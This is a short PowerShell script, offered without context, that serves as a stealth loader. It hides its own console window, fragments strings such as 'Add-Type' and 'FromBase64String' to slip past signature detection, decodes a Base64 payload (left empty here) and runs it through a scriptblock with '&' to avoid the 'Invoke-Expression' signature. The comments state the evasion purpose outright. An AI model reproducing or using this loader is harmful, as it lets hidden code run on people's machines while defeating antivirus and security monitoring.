# 1. Randomized window hider (Bypasses "ShowWindow" string detection)
$api = @'
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'@
# Fragmenting the 'Add-Type' and 'Win32' strings
$t = "Ad"+"d-Ty"+"pe"; $n = "W"+"in"+"32"
$win = & $t -MemberDefinition $api -Name $n -Namespace $n -PassThru
$win::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)

# 2. Encrypted-looking variable names
$v_alpha = ""


# 3. Use 'Reversed' or 'Fragmented' decoding to hide the "FromBase64String" signature
$method = "From"+"Base64"+"String"
$b = [System.Convert]::$method($v_alpha)
$s = [System.Text.Encoding]::Unicode.GetString($b)

# 4. Use the '&' operator to execute without using 'IEX' or 'Invoke-Expression'
$p = [scriptblock]::Create($s)
& $p